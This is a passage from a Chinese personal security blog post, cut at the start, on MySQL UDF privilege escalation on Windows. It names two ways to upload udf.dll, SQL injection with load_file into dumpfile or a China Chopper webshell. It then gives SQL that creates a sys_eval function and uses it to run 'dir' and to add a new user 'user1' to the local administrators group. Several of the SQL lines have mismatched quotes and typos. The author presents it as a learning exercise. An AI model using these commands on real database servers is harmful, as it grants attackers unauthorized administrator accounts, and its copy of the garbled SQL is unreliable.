<p>上传方式:<br>利用SQL注入进行上传<code>select load_file() into dumpfile &quot; 具体路径&quot;</code><br>使用菜刀直接上传<br>emmm我直接将文件放在对应目录下了，不演示上传<br><img src="https://img-blog.csdnimg.cn/20200701192730719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p>
<h2 id="执行提权命令"><a href="#执行提权命令" class="headerlink" title="执行提权命令"></a>执行提权命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">&#x27;udf.dll;</span></span><br><span class="line"><span class="string">select* from mysqlaiunc where name=&#x27;</span>sys_eval<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select sys _eval(&#x27;</span>dir);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sys</span> _eval(<span class="string">&#x27;net user user1 123 /add&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sys</span> _eval(<span class="string">&#x27;net localgroup administrators user1 /add&quot;); </span></span><br><span class="line"><span class="string">drop function sys_eval;</span></span><br></pre></td></tr></table></figure>
<p>如果出现这样的界面就是对了。<br><img src="https://img-blog.csdnimg.cn/20200701192839480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行下面的步骤就行。<br><img src="https://img-blog.csdnimg.cn/20200701193333804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后会执行dir命令，显示当前目录下的文件。<br>如果电脑中安装有360安全(LM)卫士，会有提示的<br><img src="https://img-blog.csdnimg.cn/20200701193518188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>emmm ,这基本就是MySQL的UDF提权的操作了。学到了好多。</p>
<p>此次学习到此结束。</p>
<p>文末寄语：</p>
<blockquote>
<p>所有的悲伤，总会留下一丝欢乐的线索。所有的遗憾，总会留下一处完美的角落。我在冰封的深海，找寻希望的缺口。却在午夜惊醒时，蓦然瞥见绝美的月光。——《缺口》</p>
</blockquote>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://images.cnblogs.com/cnblogs_com/Augenstern-blog/1822695/o_200806164747m0re2020-08-07_00-47-30.jpg"><img loading="lazy" src="https://images.cnblogs.com/cnblogs_com/Augenstern-blog/1822695/o_200806164747m0re2020-08-07_00-47-30.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://images.cnblogs.com/cnblogs_com/Augenstern-blog/1822695/o_200806164656mm_reward_qrcode_1596729168536.png"><img loading="lazy" src="https://images.cnblogs.com/cnblogs_com/Augenstern-blog/1822695/o_200806164656mm_reward_qrcode_1596729168536.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://zxcv0221.github.io/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/" title=".github.io的个人博客网站无法连接问题">https://zxcv0221.github.io/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2020/08/23/XSS%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%AE%9E%E9%AA%8C(%E8%AF%A6%E7%BB%86)%E5%8F%8Axss%E4%B9%8B%E6%97%85%E9%97%AF%E5%85%B3/" rel="prev" title="XSS盗取用户信息实验及xss之旅闯关"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">XSS盗取用户信息实验及xss之旅闯关</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/08/23/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA/" rel="next" title="Web安全漏洞靶场演示"><span class="post-nav-text">Web安全漏洞靶场演示</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 1000)</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2020 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v0.9.7</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="这里可以搜索本站内容~" value=""></div><div id="local-search-result"></div></div><script>let date = new Date();
let today = (date.getMonth() + 1) + "-" + date.getDate()
if ("4-4,9-18".indexOf(today) !== -1) {
  document.documentElement.style.filter = "grayscale(1)";
}</script></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>